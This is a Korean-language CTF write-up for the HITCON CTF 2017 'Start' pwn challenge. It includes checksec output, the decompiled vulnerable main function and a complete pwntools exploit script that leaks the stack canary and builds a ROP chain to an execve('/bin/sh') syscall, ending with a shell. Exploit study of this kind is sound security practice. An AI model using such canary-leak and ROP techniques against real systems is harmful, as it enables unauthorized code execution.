---
layout: post
title: "HITCON CTF 2017 - Start"
date: 2018-11-13
excerpt: "ROP + Syscall"
tags: [write-up]
comments: true
---
```bash
~/pwn/prob/hitcon_start st4nw@trust
❯ file start 
start: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, 
for GNU/Linux 2.6.32, BuildID[sha1]=3103fc88300977dda14d3e2723c402cf0e23717f, not stripped
```
64비트 바이너리이며 정적으로 컴파일 된 점이 특이합니다.

```bash
~/pwn/prob/hitcon_start st4nw@trust
❯ checksec start 
[*] '/home/st4nw/pwn/prob/hitcon_start/start'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Canary도 활성화 되어있습니다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-20h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  alarm(10LL, argv, envp);
  setvbuf(stdin, 0LL, 2LL, 0LL);
  setvbuf(stdout, 0LL, 2LL, 0LL);
  while ( read(0LL, &v4, 217LL) != 0 && (unsigned int)strncmp(&v4, "exit\n", 5LL) )
    puts(&v4);
  return 0;
}
```
main에서는 BOF를 대놓고 주는데 함수 목록을 보면 system / exec 계열이 없어서 syscall로 쉘을 따야 합니다.

canary는 쉽게 leak할 수 있으므로 read로 bss에 /bin/sh를 써준다음 execve syscall을 호출하면 됩니다.


exp.py
```python
from pwn import *

p = process('./start')
e = ELF('./start')

prdi = 0x4005d5
prsi = 0x4017f7
prdx = 0x443776
prax_rdx_rbx = 0x47a6e6

read = 0x440300
syscall = 0x468e75
bss = 0x6cdb68

payload = 'A' * 25
p.send(payload)
p.recvuntil('A' * 24)
canary = u64(p.recv(8)) - 0x41
log.info('Canary : ' + str(hex(canary)))

payload = 'A' * 24

payload += p64(canary)
payload += 'A' * 8

payload += p64(prdi)
payload += p64(0)
payload += p64(prsi)
payload += p64(bss)
payload += p64(prdx)
payload += p64(8)
payload += p64(read)

payload += p64(prax_rdx_rbx)
payload += p64(59)
payload += p64(bss + 0x120)
payload += p64(0)

payload += p64(prdi)
payload += p64(bss)

payload += p64(prsi)
payload += p64(bss + 0x120)
payload += p64(syscall)

p.sendline(payload)
sleep(0.3)
p.sendline('exit')
sleep(0.3)
p.sendline('/bin/sh\x00')
sleep(0.3)

p.interactive()
```

```bash
~/pwn/prob/hitcon_start st4nw@trust
❯ python exp.py 
[+] Starting local process './start': pid 29364
[*] '/home/st4nw/pwn/prob/hitcon_start/start'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Canary : 0xd8b3e6c2dab96400
[*] Switching to interactive mode
\x18󿿬
AAAAAAAAAAAAAAAAAAAAAAAA
$ id
uid=1021(st4nw) gid=1022(st4nw) groups=1022(st4nw),27(sudo)
```
